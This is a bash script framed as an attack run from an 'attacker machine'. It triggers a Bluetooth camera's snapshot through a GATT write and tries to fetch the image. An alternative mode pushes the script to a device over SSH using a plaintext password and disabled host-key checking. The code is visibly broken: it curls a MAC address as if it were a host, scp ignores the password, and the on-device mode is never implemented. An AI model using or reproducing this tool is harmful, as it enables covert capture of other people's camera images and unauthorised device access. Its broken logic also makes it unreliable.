#!/usr/bin/env bash
# bluetooth_camera_snapshot.sh
# Adapted with remote-vs-local execution: remote scan vs on-device via SSH
# Usage: ./ bluetooth_camera_snapshot.sh
# Requires appropriate tools depending on mode

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux";;
    Darwin*) echo "darwin";;
    *) echo "unknown";;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] $t not found, attempting install"
    if [[ "$(detect_os)" == "darwin" ]]; then
      brew install "$t"
    elif [[ "$(detect_os)" == "linux" ]]; then
      sudo apt-get update && sudo apt-get install -y "$t"
    else
      echo "Unsupported OS for install: $t"; exit 1
    fi
  fi
}

function remote_scan() {
  read -rp "BLE MAC: " MAC
gatttool -b "$MAC" --char-write-req --uuid=0000ff01-0000-1000-8000-00805f9b34fb -n 01
echo "Snapshot triggered"; curl -O "http://$MAC/snapshot.jpg"

}

function remote_ssh_execute() {
  local host="$SSH_HOST"
  local user="$SSH_USER"
  local pass="$SSH_PASS"
  echo "[*] Copying script and executing on-device via SSH"
  scp "$0" "$user@$host:/tmp/bluetooth_camera_snapshot.sh"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/bluetooth_camera_snapshot.sh on-device"
}

# Main
echo "Select mode:"
echo "1) Remote scan from attacker machine"
echo "2) Run on-device via SSH"
read -rp "Choice [1/2]: " MODE

if [[ "$MODE" == "2" ]]; then
  read -rp "SSH host: " SSH_HOST
  read -rp "SSH user: " SSH_USER
  read -rsp "SSH password: " SSH_PASS
  echo
  ensure_tool sshpass
  remote_ssh_execute
  exit 0
else
  # perform remote scan
  ensure_tool gatttool
ensure_tool curl
  remote_scan
  exit 0
fi
